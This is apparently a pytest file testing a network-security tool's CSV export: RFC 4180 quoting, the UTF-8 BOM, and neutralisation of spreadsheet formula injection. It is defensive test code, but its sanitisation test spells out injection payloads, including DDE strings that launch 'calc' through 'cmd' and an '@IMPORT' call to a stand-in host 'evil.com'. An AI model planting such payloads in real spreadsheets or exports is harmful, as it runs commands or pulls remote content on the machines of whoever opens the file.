"""Unit tests for RFC 4180 CSV export and spreadsheet formula injection sanitization."""

from __future__ import annotations

import csv
import io
from pathlib import Path
import pytest

from netsentinel.core.models import SecurityFinding, STATUS_OPEN
from netsentinel.core.reporting.csv_export import CSV_COLUMNS, CsvExporter


def test_csv_formula_injection_sanitization():
    # Dangerous formula triggers
    assert CsvExporter.sanitize_for_spreadsheet("=SUM(A1:A10)") == "'=SUM(A1:A10)"
    assert CsvExporter.sanitize_for_spreadsheet("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"
    assert CsvExporter.sanitize_for_spreadsheet("-2+3+cmd|' /C calc'!A0") == "'-2+3+cmd|' /C calc'!A0"
    assert CsvExporter.sanitize_for_spreadsheet("@IMPORT('http://evil.com')") == "'@IMPORT('http://evil.com')"
    assert CsvExporter.sanitize_for_spreadsheet("\t=1+1") == "'\t=1+1"
    assert CsvExporter.sanitize_for_spreadsheet("\r=1+1") == "'\r=1+1"

    # Leading whitespace before formula triggers
    assert CsvExporter.sanitize_for_spreadsheet("   =cmd") == "'   =cmd"
    assert CsvExporter.sanitize_for_spreadsheet("  +123_evil") == "'  +123_evil"
    assert CsvExporter.sanitize_for_spreadsheet("\t\t@something") == "'\t\t@something"


def test_csv_numeric_values_preserved():
    # Genuine numeric values should not be corrupted with a leading quote
    assert CsvExporter.sanitize_for_spreadsheet(80) == 80
    assert CsvExporter.sanitize_for_spreadsheet(443) == 443
    assert CsvExporter.sanitize_for_spreadsheet(70.5) == 70.5
    assert CsvExporter.sanitize_for_spreadsheet(-10) == -10
    assert CsvExporter.sanitize_for_spreadsheet("-10.5") == "-10.5"
    assert CsvExporter.sanitize_for_spreadsheet("0.95") == "0.95"


def test_csv_export_rfc4180_and_excel_bom(tmp_path: Path):
    findings = [
        SecurityFinding(
            id=1,
            asset_id=1,
            rule_id="RULE-EXP-TELNET",
            title="Telnet service, with comma and \"quotes\"",
            description="Multi-line\ndescription with \r\n special formatting",
            recommendation="Use SSH; =2+2",
            severity="High",
            risk_score=70.0,
            risk_tier="High",
            confidence=1.0,
            status=STATUS_OPEN,
            port_number=23,
            protocol="tcp",
            evidence="Banner: Telnet Ready © 2026",
            user_notes="+Risk accepted temporarily",
            ip_address="192.168.1.50",
            hostname="legacy-switch.corp",
        )
    ]

    out_file = tmp_path / "test_export.csv"
    csv_text = CsvExporter.export_findings(findings, output_file=out_file)

    # 1. Verify UTF-8 BOM is written to disk
    raw_bytes = out_file.read_bytes()
    assert raw_bytes.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM

    # 2. Verify RFC 4180 parseability
    reader = csv.reader(io.StringIO(csv_text))
    rows = list(reader)
    assert len(rows) == 2  # Header + 1 finding
    assert rows[0] == CSV_COLUMNS

    data_row = rows[1]
    assert data_row[0] == "1"
    assert data_row[1] == "RULE-EXP-TELNET"
    assert data_row[2] == 'Telnet service, with comma and "quotes"'
    assert data_row[4] == "70.0"
    assert data_row[10] == "23"
    assert data_row[11] == "tcp"
    # Verify formula trigger in user notes was safely prefixed
    assert data_row[17] == "'+Risk accepted temporarily"
    # Verify unicode preservation
    assert "© 2026" in data_row[13]
